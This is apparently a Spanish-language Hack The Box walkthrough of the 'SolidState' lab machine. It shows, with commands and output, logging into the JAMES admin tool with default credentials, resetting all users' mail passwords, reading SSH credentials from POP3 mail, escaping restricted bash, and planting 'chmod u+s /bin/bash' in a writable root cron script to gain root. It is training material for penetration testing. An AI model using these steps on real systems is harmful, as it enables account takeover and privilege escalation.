---
title: SolidState
date: 2024-08-02 23:20:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hackthebox
  - Linux
tags:
  - Information Leakage
  - Abusing Cron Job [Privilege Escalation]
  - Escaping Restricted Bash (rbash)
  - Abusing James Remote Administration Tool

image:
  path: /assets/img/SolidState/SolidState.png
---

## Skills

- Abusing James Remote Administration Tool
- Changing a user's email password
- Information Leakage
- Escaping Restricted Bash (rbash)
- Abusing Cron Job [Privilege Escalation]
  
## Certificaciones

- eJPT
  
## Descripción

`SolidState` es una máquina `easy linux`, nos `logueamos` con las `credenciales` por `defecto` en el `servicio RSIP` y les `cambiamos` la `contraseña` varios `usuarios`, posteriormente `leemos` los `correos` de estos `usuarios` accediendo al `servicio POP3` obteniendo así las `credenciales` de `SSH` de un usuario y `ganando acceso` así a la máquina víctima. Al ingresar a la máquina víctima `escapamos` de una `restricted bash` y abusando de una `tarea cron` nos convertimos en usuario `root` 

---

## Reconocimiento

Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad

```
# ping 10.129.188.225
PING 10.129.188.225 (10.129.188.225) 56(84) bytes of data.
64 bytes from 10.129.188.225: icmp_seq=1 ttl=63 time=55.9 ms
64 bytes from 10.129.188.225: icmp_seq=2 ttl=63 time=56.0 ms
64 bytes from 10.129.188.225: icmp_seq=3 ttl=63 time=58.3 ms
^C
--- 10.129.188.225 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 55.869/56.753/58.344/1.127 ms
```

### Nmap

Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de `nmap`

```
# sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.188.225 -oG openPorts
[sudo] password for justice-reaper: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-02 13:41 CEST
Initiating SYN Stealth Scan at 13:41
Scanning 10.129.188.225 [65535 ports]
Discovered open port 25/tcp on 10.129.188.225
Discovered open port 22/tcp on 10.129.188.225
Discovered open port 110/tcp on 10.129.188.225
Discovered open port 80/tcp on 10.129.188.225
Discovered open port 119/tcp on 10.129.188.225
Discovered open port 4555/tcp on 10.129.188.225
Completed SYN Stealth Scan at 13:41, 13.73s elapsed (65535 total ports)
Nmap scan report for 10.129.188.225
Host is up (0.14s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.87 seconds
           Raw packets sent: 67032 (2.949MB) | Rcvd: 67045 (2.682MB)
```

Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados

```
# nmap -sCV -p22,25,80,110,119,4555 10.129.188.225 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-02 13:49 CEST
Nmap scan report for 10.129.188.225
Host is up (0.097s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3?
119/tcp  open  nntp?
4555/tcp open  rsip?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 377.40 seconds
```

## RSIP Enumeration

Nos `conectamos` usando las `credenciales` por defecto `root:root`

```
# nc -nv 10.129.188.225 4555
(UNKNOWN) [10.129.188.225] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
quit
Bye
```

`Listamos usuarios` y les `cambiamos` la `contraseña` a todos ellos

```
# telnet 10.129.188.225 4555
Trying 10.129.188.225...
Connected to 10.129.188.225.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
listusers
Existing accounts 6
user: james
user: thomas
user: john
user: mindy
user: mailadmin
setpassword james test
Password for james reset
setpassword thomas test
Password for thomas reset
setpassword john test
Password for john reset
setpassword mindy test
Password for mindy reset
setpassword mailadmin test
Password for mailadmin reset
```

## POP3 Enumeration

Nos `conectamos` como el usuario `mindy` y `vemos` los `mensajes` que tiene en la `bandeja de entrada` del correo electrónico

```
# telnet 10.129.188.225 110
Trying 10.129.188.225...
Connected to 10.129.188.225.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS test
+OK Welcome mindy
list
+OK 2 1945
1 1109
2 836
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

## Intrusión

Nos conectamos por `SSH` y `escapamos` de la `restricted bash`

```
# ssh mindy@10.129.188.225 bash   
mindy@10.129.188.225's password: 
whoami
mindy
```

Obtenemos las `dimensiones` de nuestra `pantalla` 

```
# stty size
45 183
```

Efectuamos el `tratamiento` a la `TTY`

```
# script /dev/null -c bash
[ENTER]
[CTRL + Z]
# stty raw -echo; fg
[ENTER]
# reset xterm
[ENTER]
# export TERM=xterm
[ENTER]
# export SHELL=bash
[ENTER]
# stty rows 45 columns 183
[ENTER]
```

Ya estamos en una `TTY` completamente `interactiva`

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
mindy
```

`Imprimimos` el `PATH` en nuestra máquina

```
# echo $PATH            
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/snap/bin:/home/mindy/.local/bin
```

`Exportamos` el `PATH` a la máquina víctima 

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/snap/bin:/home/mindy/.local/bin
```

## Privilege Escalation

Nos `montamos` un `servidor http` con `python` en nuestra máquina para transferir el `pspy32` a la máquina víctima [https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1). Vamos a `analizar` los `procesos` del `sistema`

```
# python -m http.server 80
```

Nos `descargamos` el `pspy32`

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ wget http://10.10.16.35/pspy32
--2024-08-02 13:17:13--  http://10.10.16.35/pspy32
Connecting to 10.10.16.35:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy32’

pspy64                                        100%[================================================================================================>]   2.96M   865KB/s    in 3.6s    

2024-08-02 13:17:17 (834 KB/s) - ‘pspy32’ saved [3104768/3104768]
```

`Ejecutamos pspy` y encontramos que el usuario `root` está `ejecutando` un `script` que se encuentra en `/opt`

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ./pspy32
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2024/08/02 13:24:01 CMD: UID=0     PID=8621   | python /opt/tmp.py 
2024/08/02 13:24:01 CMD: UID=0     PID=8622   | sh -c rm -r /tmp/*  
2024/08/02 13:24:01 CMD: UID=0     PID=8623   | sh -c rm -r /tmp/*  
```

Podemos `modificar` el `archivo` para que nos `spawnee` una `shell`

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -l
total 8
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py 
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

`Modificamos` el archivo `tmp.py` para que le de permisos `SUID` a la `bash`

```
#!/usr/bin/env python
import os
import sys
try:
     os.system('chmod u+s /bin/bash')
except:
     sys.exit()
```

`Ejecutamos` este `comando` para que `cada segundo` nos `indique` el `estado` de la `bash`

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ watch -n 1 -c -x ls -l /bin/bash
Every 1.0s: ls -l /bin/bash                                                                                                                        solidstate: Fri Aug  2 13:37:47 2024
-rwsr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
```

Nos `convertimos` en usuario `root`

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ bash -p
bash-4.4# whoami
root
```
